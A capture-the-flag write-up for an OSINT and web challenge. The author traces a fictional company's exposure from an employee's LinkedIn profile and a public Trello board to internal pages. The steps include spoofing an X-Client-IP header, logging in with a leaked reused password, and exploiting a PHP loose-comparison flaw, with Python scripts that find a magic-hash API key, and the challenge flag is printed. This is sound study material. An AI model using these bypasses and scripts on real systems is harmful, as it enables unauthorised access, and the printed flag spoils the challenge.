# Table of Content
- [OSINT](#osint)
  - [Uncover the TTP of an adversary](#Uncover-the-TTP-of-an-adversary)

# OSINT
## ## Uncover the TTP of an adversary
![osint category](https://img.shields.io/badge/category-osint-lightgrey.svg)
![score](https://img.shields.io/badge/score-484-blue.svg)
![solves](https://img.shields.io/badge/solves-5-brightgreen.svg)

### Description

DraftDown Labs who had worked with several high-profile clients just got hit by an espionage motivated adversary, an IR company was engaged to investigate the cause. Rumour then started floating in the midst of investigation that an internal researcher named ‘Tom Horlicks’ reuses his password _sUp3RPa55w0!RD_9_ for his day to day operations at DraftDown Labs. Re-trace how the adversary got initial access to DraftDown Labs network.

Note: Sending of multiple requests (bruteforcing) to **ANY** website is strictly not allowed.

Note: Any accounts belonging to individuals outside of DraftDownLabs is explicitly out of scope. If the company isn't explicitly mention, assume it to be out of scope. If you're still unclear about whether a profile is in scope, do open a ticket and check with us.

P.S: There are some bot accounts on some social media websites using the same profile picture as the target and posting non-family friendly content. Please note that those accounts are out of scope for the challenge.


**Hints**
1. We love to connect with professionals around the world.

2. His profile mentions that he's open to collaboration with other security researchers during Singapore time (10:00 AM, 2:00 PM, 5:00 PM AND 8:00 PM). Maybe he'll repond to connection invitations during these periods?


### Solution

Googling for `Tom Horlicks` reveals some leads and one that seems to contain `DraftDownLabs`.
![[Pasted image 20220925234630.png]]


So, going to the link and visiting the "real" Tom Horlicks doesn't give us anything.

But after connecting with him through the "Connect" feature on LinkedIn (after it has been accepted). We can now see his contact and most importantly his interest list, though this was not obvious to me... Instead I thought I was supposed "Social Engineer" him for more information to find a vector.

![[Pasted image 20220925235036.png]]

But, it seems that by trying to "Social Engineer" the person, I was nudged back to the intended path - The interest list.

Viewing the interest list.
![[Pasted image 20220925235216.png]]

We can start to figure some potential leads, especially those likely to have login.
In this list, Atlassian, Asana and Trello seems to be the more interesting ones.

But unfortunately, there were no login leads. However, my teammate @jxt00 was able to find that the Trello was publicly accessible. Giving us the more leads to work on.

![](https://lh3.googleusercontent.com/WdYX0PQRtR-aZ3U506nRPlmBXE6wJ3kJ7syTtzuPvLKzpwDzUAYqPpWd52kwRIxE04snFWrAYQcjE2pI9xWqdyUGq_fR8rCRcM467oVnQl0XsHefauXmf0drgPLeURGEvC22VOjtNhy1WN5TaWqTcwv9wRTiYp6otkUOM20qQveR9SYZYum3ySWz7w)

![](https://lh5.googleusercontent.com/pVCUT4w-CqDXoOPAl86VqLYltsBM6HcPEHh0RGv-NOYTfT1_vWH-_ctWMRGcgiDZJDj7aty0vEGKEe4SFrw5gO3w6uBmo-Nfskx9l--83GTltcOssPHcTPUG59JkcpNtmHAfax-vHKWyuyV2sCa3mtVGqW4ZpNnmd_EiTGaP940dgnDrPAII5IrkEw)


Here, we can start visiting the internal pages at `https://draftdownlabs.com/internal/r3s34rch_l4b5.php`.

But visiting the page seems to be empty... Or maybe not!
![[Pasted image 20220925235643.png]]

This means that we can make use of the `X-Client-IP` header to gain internal access. But setting the header `X-Client-Ip: 127.0.0.1` was only the first step as now, we are prompted with the following
![[Pasted image 20220925235854.png]]

From here, we can also see the authentication being used
![[Pasted image 20220925235930.png]]

And through some googling, we can see that we need to include the `Authorization` header along with our credentials base64 encoded as such `base64(username:password)` before we pass it to the server, and this should give us access.

![[Pasted image 20220926000114.png]]

Yes! Now we have a 302 Found linking to the `sup3r_s3cr3t.pdf` file and following the redirect does indeed reveal the pdf data.

From here, I downloaded it the pdf and it seems that the source code for their API is found in pastebin url... And the URL we are targetting next is `/internal/thh38267184.php`
![[Pasted image 20220926000316.png]]

Going to the pastebin and downloading it with the provided password `draftdownlabs`. We can see the source code as shown below.
``` sourceCode.php
<?php 
 
$flag = "DDL{<FLAG>}";
$key = "0e51[REDACTED]";
 
$response1 = new stdClass();
$response1->flag = $flag;
$response1->remarks = "YOU GOT THE FLAG!";
$json_response1 = json_encode($response1);
 
 
$apikey=NULL;
$secret = 'DDL_SuP3RSecret';
foreach (getallheaders() as $name => $value) {
        if ($name == 'x-api-key') {
                        if ($value !==$key){
                                $hmac = md5($secret . $value);
                                $apikey = substr($hmac, 0, 4);
                                echo("Error Code ".$apikey." <br>");
                        }
                        else {
                        $apikey = $value;
                        }
                }
}
 
if ($apikey == $key){
        echo('correct key'.'<br>');
        echo($json_response1);
}
 
else{
    echo ('UNAUTHORIZED: x-api-key is incorrect.');
}
?>
```

Analyzing the code, it seems that the possible vulnerable part of the code is likely to be the loose comparison between `$apikey` which we semi-control and `$key`.

But! Since `$key` is set to `0e51[REDACTED]`, we can simply force the check to be `0eXXXX == 0e51[REDACTED]` and this will evaluate to true, giving us the flag.

Furthermore, when an invalid api key is provided, it does not immediately return the response and instead allows the code to flow down to the `if else` condition at the bottom.

So, with that I generated a script to find a API key that when concatenated with `DDL_SuP3RSecret`  and md5 hashed will result in `0eXXXX...`.
```
import hashlib
import requests
import re

def findVulnerableHash():
    tryVal = 0
    while 1:
        m = hashlib.md5()
        concat = "DDL_SuP3RSecret" + str(tryVal)
        m.update(concat.encode())
        # hmac is only offset 0 to 3 [0:4]
        check = m.hexdigest()[0:4]
        print(tryVal, check)
        if re.match(r'0+[eE]\d+$', check):
            print("The valid value for api-key is", tryVal)
            return tryVal
        tryVal += 1
print(findVulnerableHash())
# Gives us 1372 as the API-key we need.
```

As such, we can now send it along as the `X-Api-Key` header value which will give us flag. 

![[Pasted image 20220926001413.png]]

And with that, we have the flag! Also, notice how the `Error Code` is printed despite us getting the flag suggesting the flaw that the developers made - PHP loose comparison and not immediately returning the invalid response. 


*Extra* - Below, I have also attached the final script I used to automate the win!
``` script.py
import hashlib
import requests
import re

headers = {
    "X-Client-IP" : "127.0.0.1",
    "Authorization" : "Basic dGhoMzgyNjcxODQ5OnNVcDNSUGE1NXcwIVJEXzk="
}

def findVulnerableHash():
    tryVal = 0
    while 1:
        m = hashlib.md5()
        concat = "DDL_SuP3RSecret" + str(tryVal)
        m.update(concat.encode())
        # hmac is only offset 0 to 3 [0:4]
        check = m.hexdigest()[0:4]
        print(tryVal, check)
        if re.match(r'0+[eE]\d+$', check):
            print("The valid value for api-key is", tryVal)
            return tryVal
        tryVal += 1

def sendRequest(api_key):
    headers["X-Api-Key"] = str(api_key)
    target = "https://draftdownlabs.com/internal/thh38267184code.php"
    r = requests.get(target, headers=headers)
    print("Response...")
    print(r.text)

api_key = findVulnerableHash()
sendRequest(api_key)
```

### Sidetracking... (Skip this if not interested)
With the email and password, I thought maybe I had to find an internal endpoint. But not knowing where to go, I checked the draftdownlabs' robots.txt since it was in scope.
```
User-agent: *
Disallow: /wp-admin
Disallow: /wp-admin/admin-ajax.php
Disallow: /wp-includes
Disallow: /wp-content/plugins
Disallow: /wp-content/cache
Disallow: /wp-content/themes
Disallow: /trackback
Disallow: /feed
Disallow: /comments
Disallow: /category/*/*
Disallow: */trackback
Disallow: */feed
Disallow: */comments
Disallow: /*?*
Disallow: /*?
Disallow: /tags/
Disallow: /portfolio_page/

# Google Image
User-agent: Googlebot-Image
Allow: /*
Disallow: /cgi-bin
Disallow: /wp-admin
Disallow: /wp-includes
Disallow: /trackback
Disallow: /comments
```

This proved to be somewhat useful information although this turned out to be way far off :(

Visiting the `/wp-admin` endpoint I was able to see the exposed wordpress login
![[Pasted image 20220926002431.png]]

But, trying out the credentials turned out to be not valid which I guess it's expected since gaining access here will expose their production-use wordpress.

And this is essentially the side track that I went through while trying to gain some access as the "adversary".

### Flag
```
CYBERLEAGUE{IsProudToPr3s3n+_CYBERLEAGUE}
```
